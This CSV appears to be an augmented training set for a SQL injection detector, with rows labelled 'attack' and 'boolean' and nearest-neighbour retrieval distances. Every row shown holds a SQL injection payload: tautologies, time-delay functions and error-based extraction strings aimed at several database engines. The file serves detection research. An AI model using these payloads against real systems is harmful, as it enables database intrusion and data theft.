id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000238,attack,boolean,"1%'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002968,0.4445600570639444
SMOTE_000239,attack,boolean,"1""  )   where 3958  =  3958 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R003002,0.47371748470302816
SMOTE_000240,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R001377,0.46383828589048637
SMOTE_000241,attack,boolean,"1%'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001997,0.17394689090135892
SMOTE_000242,attack,boolean,"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'yqzg'  =  'yqzg",nearest_attack_euclidean,R003331,0.042098363200469585
SMOTE_000243,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'aatp'  =  'aatp",nearest_attack_euclidean,R003029,0.015963198126739072
SMOTE_000244,attack,boolean,"1%""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001812,0.0004398048986693716
SMOTE_000245,attack,boolean,"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'xuwl' like 'xuwl",nearest_attack_euclidean,R000896,0.022913160493914862
SMOTE_000246,attack,boolean,"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",nearest_attack_euclidean,R002977,0.02416344037789621
SMOTE_000247,attack,boolean,-7950'  )   or 9323  =  9323#,nearest_attack_euclidean,R002940,0.05901218796556207
SMOTE_000248,attack,boolean,"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'uwbh'  =  'uwbh",nearest_attack_euclidean,R003055,0.31265036596318213
SMOTE_000249,attack,boolean,-7279  )   or 9898  =  9963 and   (  1481  =  1481,nearest_attack_euclidean,R001177,0.557627859456094
SMOTE_000250,attack,boolean,"-3933%""   )    )    or elt  (  8142  =  2978,2978  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001436,0.44894507393055727
SMOTE_000251,attack,boolean,"1'+  (  select llcl where 8188  =  8188 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000804,0.1681855966669117
SMOTE_000252,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001358,0.2175622598634204
SMOTE_000253,attack,boolean,hi'  )   or   (  'a'  =  'a,nearest_attack_euclidean,R000072,0.3076378328261828
SMOTE_000254,attack,boolean,admin'  )   or '1'  =  '1'--,nearest_attack_euclidean,R000082,0.7672735191997057
SMOTE_000255,attack,boolean,"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",nearest_attack_euclidean,R002331,0.10103126524441224
SMOTE_000256,attack,boolean,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000410,0.1592779250212768
SMOTE_000257,attack,boolean,"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'lxoc'  =  'lxoc",nearest_attack_euclidean,R002455,0.16295574461281448
SMOTE_000258,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",nearest_attack_euclidean,R000980,0.14258385447445251
SMOTE_000259,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",nearest_attack_euclidean,R002645,0.08259564734537138
SMOTE_000260,attack,boolean,"-6629%""   )    )     )   or 8571  =  8571--",nearest_attack_euclidean,R002509,0.009442442217155626
SMOTE_000261,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,nearest_attack_euclidean,R000488,1.6858739404357614e-07
SMOTE_000262,attack,boolean,"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz",nearest_attack_euclidean,R002558,0.003625943039100633
SMOTE_000263,attack,boolean,"1%""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000344,0.38066082197077883
SMOTE_000264,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'ujcx'  =  'ujcx",nearest_attack_euclidean,R001560,0.09518432844122726
SMOTE_000265,attack,boolean,"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001916,0.31867092459296015
SMOTE_000266,attack,boolean,"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000822,0.007210488002707935
SMOTE_000267,attack,boolean,"-3081""   )    )     )   or 3736  =  1899",nearest_attack_euclidean,R000377,0.0004953659658730608
SMOTE_000268,attack,boolean,"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000285,0.7903235127492907
SMOTE_000269,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""oiuw""  =  ""oiuw",nearest_attack_euclidean,R001280,0.05742117984719348
SMOTE_000270,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'pfal'  =  'pfal,nearest_attack_euclidean,R002774,0.2837761173795554
SMOTE_000271,attack,boolean,1' in boolean mode  )   and 4595  =  4595#,nearest_attack_euclidean,R002485,0.100299160559119
SMOTE_000272,attack,boolean,"1"" and make_set  (  4214  =  9503,9503  )   and ""phjg"" like ""phjg",nearest_attack_euclidean,R002224,0.35442218528205616
SMOTE_000273,attack,boolean,x' or full_name like '%bob%,nearest_attack_euclidean,R000145,1.407012355523577
SMOTE_000274,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R002260,0.7280091263799532
SMOTE_000275,attack,boolean,"1%' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003251,0.10857670311318168
SMOTE_000276,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  '%'  =  '",nearest_attack_euclidean,R003218,0.03534519163824298
SMOTE_000277,attack,boolean,"1'   )    )    as pstn where 6691  =  6691 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R001656,0.8905761793078033
SMOTE_000278,attack,boolean,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # odvp,nearest_attack_euclidean,R001999,0.1455365598367883
SMOTE_000279,attack,boolean,"1%""   )    )    and   (  7817  =  4371  )  *4371 and    (    (   ""%""  =  """,nearest_attack_euclidean,R002888,0.4980097307748871
SMOTE_000280,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R002064,0.007159449787543453
SMOTE_000281,attack,boolean,"1%' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000603,0.4482599567779523
SMOTE_000282,attack,boolean,-5031' or 9323  =  9323#,nearest_attack_euclidean,R002358,0.047578957687415865
SMOTE_000283,attack,boolean,"1'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001118,0.0684095175906484
SMOTE_000284,attack,boolean,"1   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   5683  =  5683",nearest_attack_euclidean,R003075,0.5524391441575148
SMOTE_000285,attack,boolean,"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""vhmc""  =  ""vhmc",nearest_attack_euclidean,R001695,0.27691728265036925
SMOTE_000286,attack,boolean,"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz",nearest_attack_euclidean,R002558,0.30745202846650926
SMOTE_000287,attack,boolean,1' where 6359  =  6359 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R001995,0.41433893246710257
SMOTE_000288,attack,boolean,"1%"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R002169,0.0912450555502222
SMOTE_000289,attack,boolean,1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,nearest_attack_euclidean,R001760,0.32942515273564754
SMOTE_000290,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",nearest_attack_euclidean,R000818,0.051736528811338826
SMOTE_000291,attack,boolean,"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""qqfd"" like ""qqfd",nearest_attack_euclidean,R002491,0.713570922683817
SMOTE_000292,attack,boolean,"1%'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001986,0.10358414235218384
SMOTE_000293,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R001888,0.35977535671464994
SMOTE_000294,attack,boolean," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000011,0.07191363557086801
SMOTE_000295,attack,boolean,"1%""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R001091,0.07927606572086403
SMOTE_000296,attack,boolean,"-2256""   )    )     )   or 1971  =  4537#",nearest_attack_euclidean,R000823,0.36689582780334346
SMOTE_000297,attack,boolean,-7941 or   (  5822  =  8754  )  *8754-- eepn,nearest_attack_euclidean,R000481,0.03723130075726268
SMOTE_000298,attack,boolean,-9358' or 9887  =  2569--,nearest_attack_euclidean,R000948,0.03491519305026286
SMOTE_000299,attack,boolean,"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001778,0.20806816888628615
SMOTE_000300,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002626,0.8173910772594271
SMOTE_000301,attack,boolean,"1%""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R002987,0.20591257649365513
SMOTE_000302,attack,boolean,"1'||  (  select 'cjwx' from dual where 7637  =  7637 and elt  (  9548  =  3991,3991   )    )   ||'",nearest_attack_euclidean,R001213,0.0136696486213877
SMOTE_000303,attack,boolean,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'wdeu' like 'wdeu",nearest_attack_euclidean,R001621,0.19057020104513908
SMOTE_000304,attack,boolean,"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lano""  =  ""lano",nearest_attack_euclidean,R002149,1.009895290204797
SMOTE_000305,attack,boolean,1'   )    )    as cyom where 2318  =  2318 and 7533  =  7533--,nearest_attack_euclidean,R002556,0.22563143122085946
SMOTE_000306,attack,boolean,1'   )    )     )   and 1743  =  6793 and    (    (     (  'rgcv'  =  'rgcv,nearest_attack_euclidean,R002654,0.33677722811765115
SMOTE_000307,attack,boolean,"-2044%'   )    )    or elt  (  9299  =  3618,3618  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000576,0.06370339292100079
SMOTE_000308,attack,boolean,"1' where 1673  =  1673 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R002672,1.0342767604862386
SMOTE_000309,attack,boolean,"1 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003136,0.1266208446542609
SMOTE_000310,attack,boolean,"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000834,0.5965562765638731
SMOTE_000311,attack,boolean,"1""   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R003526,0.032183591217300626
SMOTE_000312,attack,boolean,"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,nearest_attack_euclidean,R001332,0.21984978940254796
SMOTE_000313,attack,boolean,"-7469  )   where 5875  =  5875 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R001038,0.09289321925714936
SMOTE_000314,attack,boolean,"1   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   8867  =  8867",nearest_attack_euclidean,R002667,0.10397412326438021
SMOTE_000315,attack,boolean,"-7295""  )   or 9323  =  9323#",nearest_attack_euclidean,R001869,0.3215255630699267
SMOTE_000316,attack,boolean,select * from users where id  =  1.<@. or 1  =  1 -- 1,nearest_attack_euclidean,R000075,0.05009883734814009
SMOTE_000317,attack,boolean,"1%""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001731,0.2774194395044637
SMOTE_000318,attack,boolean,"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R002872,0.008480234044089725
SMOTE_000319,attack,boolean,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R001307,0.38024665735100366
SMOTE_000320,attack,boolean,"1"" and 4996  =  4431 and ""jzaq""  =  ""jzaq",nearest_attack_euclidean,R003454,1.1024575460811712
SMOTE_000321,attack,boolean,"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  5215  =  5215",nearest_attack_euclidean,R002085,1.3496353713380023
SMOTE_000322,attack,boolean,"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""vcjt"" like ""vcjt",nearest_attack_euclidean,R000575,0.11725817491533766
SMOTE_000323,attack,boolean,"1""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R002828,0.024825206721594693
SMOTE_000324,attack,boolean,-9660   )    )    or 9762  =  9698,nearest_attack_euclidean,R003482,0.290586071953968
SMOTE_000325,attack,boolean,1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R003133,0.03976935852249757
SMOTE_000326,attack,boolean,"1%"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001396,0.5498370508961848
SMOTE_000327,attack,boolean,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R003209,0.10547023688734086
SMOTE_000328,attack,boolean,"-9265""  )   or 7834  =  1685",nearest_attack_euclidean,R001887,0.8771694144816801
SMOTE_000329,attack,boolean,-9650'  )   or 1390  =  3209,nearest_attack_euclidean,R001640,0.002140262548241395
SMOTE_000330,attack,boolean,"1""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""lide""  =  ""lide",nearest_attack_euclidean,R001700,0.27692468391934916
SMOTE_000331,attack,boolean,1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,nearest_attack_euclidean,R002436,0.0017494930008294719
SMOTE_000332,attack,boolean,"1%""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R003375,0.07740533386546239
SMOTE_000333,attack,boolean,1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,nearest_attack_euclidean,R000909,1.0080780117381818
SMOTE_000334,attack,boolean,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000118,1.1704895616328714
SMOTE_000335,attack,boolean,"1   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   5776  =  5776",nearest_attack_euclidean,R001382,1.1390199226503916
SMOTE_000336,attack,boolean,"1' where 8869  =  8869 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R002093,0.12119763528537784
SMOTE_000337,attack,boolean,"1""  )   and 8677  =  9054#",nearest_attack_euclidean,R002557,0.17136020240556382
SMOTE_000338,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000811,0.16981196236422572
SMOTE_000339,attack,boolean,1'   )    )    and 3814  =  4272--,nearest_attack_euclidean,R000888,0.17618482931350793
SMOTE_000340,attack,boolean,"1%""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001812,0.10234949927241117
SMOTE_000341,attack,boolean,"1%""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R002461,0.38602560968565613
SMOTE_000342,attack,boolean,"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa",nearest_attack_euclidean,R003317,0.4160623297033333
SMOTE_000343,attack,boolean,"-1668""   )    )     )   or 9323  =  9323#",nearest_attack_euclidean,R001343,0.32510024518997216
SMOTE_000344,attack,boolean,1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'yvxg'  =  'yvxg,nearest_attack_euclidean,R001633,0.05372233588667404
SMOTE_000345,attack,boolean,"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa",nearest_attack_euclidean,R003317,0.6383312660524424
SMOTE_000346,attack,boolean,1'   )    )     )   and 3602  =  1990#,nearest_attack_euclidean,R000954,0.06713638908074174
SMOTE_000347,attack,boolean,-9668'   )    )    as orfu where 5822  =  5822 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000785,0.09127504831100759
SMOTE_000348,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",nearest_attack_euclidean,R002532,0.06730918211381641
SMOTE_000349,attack,boolean,"1""   )    )    and elt  (  3785  =  9386,9386  )   and    (    (   ""inwa"" like ""inwa",nearest_attack_euclidean,R002757,0.47870498022862984
SMOTE_000350,attack,boolean,-2036'  )   or   (  8459  =  8459  )  *4906 and   (  'hjeu'  =  'hjeu,nearest_attack_euclidean,R002845,0.0010965839115175003
SMOTE_000351,attack,boolean,"-8186%' or elt  (  1032  =  1032,3623  )   and '%'  =  '",nearest_attack_euclidean,R001103,0.5420180705257036
SMOTE_000352,attack,boolean,"1'  )   where 7279  =  7279 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002297,0.019268387789131997
SMOTE_000353,attack,boolean,admin'  )   or '1'  =  '1'--,nearest_attack_euclidean,R000082,0.014289942610292672
SMOTE_000354,attack,boolean,"1""  )   as cxwd where 5800  =  5800 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002065,0.17166604334323798
SMOTE_000355,attack,boolean,"1%""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R002798,0.3361976094284637
SMOTE_000356,attack,boolean,"-4983%""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,nearest_attack_euclidean,R003139,0.14060331727168832
SMOTE_000357,attack,boolean," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000011,0.03573745777895942
SMOTE_000358,attack,boolean,1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm,nearest_attack_euclidean,R000928,0.2655701712323159
SMOTE_000359,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,8.429369702178807e-08
SMOTE_000360,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'yvbb'  =  'yvbb",nearest_attack_euclidean,R003174,0.22234158037987137
SMOTE_000361,attack,boolean,select * from users where id  =  1.*1 or 1  =  1 -- 1,nearest_attack_euclidean,R000148,0.7069069677131566
SMOTE_000362,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   '%'  =  '",nearest_attack_euclidean,R000696,0.2583734928165244
SMOTE_000363,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R002843,0.7528895884648353
